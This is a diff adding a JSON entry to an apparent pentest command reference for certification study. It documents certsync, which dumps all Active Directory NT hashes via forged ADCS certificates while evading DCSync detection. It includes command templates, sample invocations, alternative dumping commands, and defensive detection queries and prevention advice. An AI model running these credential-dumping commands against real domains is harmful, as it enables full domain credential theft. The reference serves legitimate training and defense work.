@@ -1,0 +1,101 @@
+{
+  "id": "ad-certsync",
+  "name": "certsync - NTDS Dump via ADCS (No DRSUAPI)",
+  "command": "certsync -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -ns <dc_ip>",
+  "description": "certsync dumps NTDS secrets without using DRSUAPI (DCSync). It enumerates users via LDAP, retrieves the CA certificate and private key, forges certificates for each user, then uses PKINIT + UnPAC-the-hash to recover NT hashes. This evades DCSync-focused detections and works even where replication is monitored or restricted.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Credential Dumping",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "zblurx/certsync",
+  "tags": [
+    "certsync",
+    "ntds",
+    "dcsync",
+    "adcs",
+    "pkinit",
+    "unpac-the-hash",
+    "ca-key"
+  ],
+  "mitre": [
+    "T1003.006",
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== REQUIREMENTS ===\n  # Access to the CA private key (e.g. via Certipy -backup, or ESC chain, or admin on CA)\n  # Or run the full flow if you can extract the CA key\n\n=== DUMP NTDS WITHOUT DCSYNC ===\n  certsync -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -ns <dc_ip>\n\n=== PROVIDE CA KEY/CERT EXPLICITLY ===\n  certsync -u <user> -p <password> -d <domain> -dc-ip <dc_ip> -ns <dc_ip> \\\n    -ca-pfx ca.pfx\n\n=== HOW IT WORKS ===\n  1. LDAP: enumerate all domain users + their SIDs\n  2. Retrieve CA cert + private key (from CA host or backup)\n  3. For each user: forge a client-auth certificate\n  4. PKINIT with the forged cert to get a TGT\n  5. UnPAC-the-hash: extract the NT hash from the PAC\n  # Result: NT hashes for all users, no replication (DRSUAPI) call\n\n=== ALTERNATIVES ===\n  secretsdump.py @dc  # classic DCSync (DRSUAPI) - more detectable\n  certipy ca -backup  # grab the CA key first\n  ntdsutil / ntds.dit + VSS  # on-host DB copy",
+  "examples": [
+    {
+      "label": "NTDS dump without DRSUAPI",
+      "command": "certsync -u jdoe -p Passw0rd! -d corp.local -dc-ip 10.10.10.5 -ns 10.10.10.5"
+    },
+    {
+      "label": "With explicit CA pfx",
+      "command": "certsync -u jdoe -p Passw0rd! -d corp.local -dc-ip 10.10.10.5 -ns 10.10.10.5 -ca-pfx ca.pfx"
+    }
+  ],
+  "references": [
+    {
+      "title": "certsync",
+      "url": "https://github.com/zblurx/certsync"
+    },
+    {
+      "title": "MITRE T1003.006 - DCSync",
+      "url": "https://attack.mitre.org/techniques/T1003/006/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-secretsdump-dcsync",
+      "note": "Classic DCSync via DRSUAPI - more detectable alternative.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-certipy-toolkit",
+      "note": "Certipy backs up the CA key certsync needs.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-certifried",
+      "note": "Related ADCS certificate forgery attack.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "With the CA private key, an attacker can forge authentication certificates for any user, then exchange them for TGTs via PKINIT and recover NT hashes from the PAC (UnPAC-the-hash) - obtaining credentials without the DRSUAPI replication call that DCSync detections watch.",
+    "prerequisites": "The ADCS CA private key (via CA host compromise, Certipy -backup, or an ESC misconfiguration); LDAP read; network to DC and CA.",
+    "impact": "Full domain credential compromise (all NT hashes) while bypassing DCSync detection.",
+    "detection": "[MITRE T1003.006/T1649] Burst of certificate issuance / PKINIT (4768 with certificate pre-auth) for many distinct users from one host; CA private key access/export; absence of the usual 4662 DRSUAPI replication pattern.",
+    "artifacts": "Many Kerberos AS-REQ with PKINIT for distinct principals in a short window; CA audit events for key export; forged certs not issued through normal enrollment.",
+    "splunk_spl": "index=windows EventCode=4768 CertIssuerName=*\n| bin _time span=5m\n| stats dc(TargetUserName) as users by _time, IpAddress\n| where users > 10",
+    "elastic_kql": "event.code:4768 and winlog.event_data.CertIssuerName:*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4768 and isnotempty(CertIssuerName)\n| summarize Users=dcount(TargetUserName) by IpAddress, bin(TimeGenerated, 5m)\n| where Users > 10",
+    "sigma_rules": "win_adcs_mass_pkinit_certsync",
+    "prevention": "Protect the CA private key (HSM, restrict CA admin); monitor CA key export; enable strong certificate mapping (KB5014754); audit certificate issuance; treat CA servers as Tier-0.",
+    "sources": [
+      "zblurx/certsync",
+      "https://attack.mitre.org/techniques/T1003/006/"
+    ],
+    "detections": [
+      {
+        "platform": "splunk",
+        "name": "Mass PKINIT authentication (certsync / cert forgery)",
+        "logic": "index=windows EventCode=4768 CertIssuerName=*\n| bin _time span=5m\n| stats dc(TargetUserName) as unique_users values(TargetUserName) as users by _time, IpAddress\n| where unique_users > 10",
+        "data_source": "windows-security",
+        "attack": [
+          "T1003.006",
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Smartcard mass-logon events in high-assurance environments",
+        "tuning": "Baseline normal PKINIT volume; alert on single-source many-user bursts"
+      }
+    ]
+  }
+}
